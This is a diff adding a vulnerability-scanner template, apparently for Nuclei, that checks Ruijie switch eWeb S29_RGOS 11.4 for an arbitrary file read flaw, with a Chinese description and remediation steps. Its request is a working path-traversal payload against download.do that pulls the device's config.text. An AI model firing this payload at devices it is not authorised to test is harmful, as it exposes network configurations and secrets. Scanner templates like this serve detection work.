@@ -1,0 +1,45 @@
+id: ruijie-networks-lfi
+info:
+  name: Ruijie Networks Switch eWeb S29_RGOS 11.4 LFI
+  author:
+  - l0ne1y
+  tags:
+  - ruijie
+  - lfi
+  description: |-
+    锐捷 交换机eweb 存在任意文件读取漏洞
+    锐捷网络股份有限公司是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。北京星网锐捷网络技术有限公司交换机eweb存在任意文件读取漏洞，攻击者可利用该漏洞获取系统敏感信息。
+  reference:
+  - https://exploit-db.com/exploits/48755
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.ruijie.com.cn/gy/xw-aqtg/87328/
+    https://www.ruijie.com.cn/fw/rj-first-2348/
+
+    临时修复方案：
+    1、过滤\".\"，使用户在url中不能回溯上级目录。
+    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
+    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
+    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
+    5、用户下载文件之前进行权限校验。
+requests:
+- matchers:
+  - type: word
+    part: header
+    words:
+    - filename="config.text"
+    - 'Content-Type: application/octet-stream'
+  - type: word
+    condition: and
+    part: body
+    words:
+    - version S29_RGOS 11.4
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/download.do?file=../../../../config.text'
+  method: GET
